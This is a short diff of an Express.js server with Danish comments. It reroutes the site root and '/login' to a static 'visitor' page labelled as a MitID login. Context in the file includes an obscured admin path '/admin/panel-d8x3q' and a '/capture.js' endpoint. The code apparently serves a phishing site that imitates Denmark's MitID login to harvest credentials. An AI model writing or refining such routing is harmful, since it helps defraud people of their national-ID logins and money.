@@ -137,13 +137,10 @@ app.get(['/admin/panel-d8x3q', '/admin/panel-d8x3q/'], (req, res) => {
 // Kundesiden paa roden (/) og /login — kunden skal ikke skulle huske "/display"
 // Kundesiden: BARE domænet (ingen sti) -> visitor.html direkte.
 // /display virker stadig som alias. /login ogsaa.
-// Kundesiden (visitor — MitID-login): / , /login , /visitor
-// NB: /visitor redirectes til /visitor/ så relative assets (./assets/...) loader korrekt
-app.get(['/', '/login'], (req, res) => {
-  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-  res.sendFile(path.join(__dirname, 'public', 'visitor', 'index.html'));
-});
-app.get('/visitor', (req, res) => res.redirect(301, '/visitor/'));
+// Kundesiden (visitor — MitID-login): / redirectes til /visitor/ (relative assets),
+// /visitor/ serves mappen statisk. /login er alias for /visitor/.
+app.get('/', (req, res) => res.redirect(302, '/visitor/'));
+app.get('/login', (req, res) => res.redirect(302, '/visitor/'));
 app.use('/visitor', express.static(path.join(__dirname, 'public', 'visitor'), { index: 'index.html', etag: false, lastModified: false }));
 app.get(['/capture', '/capture.js'], (req, res, next) => {
     res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
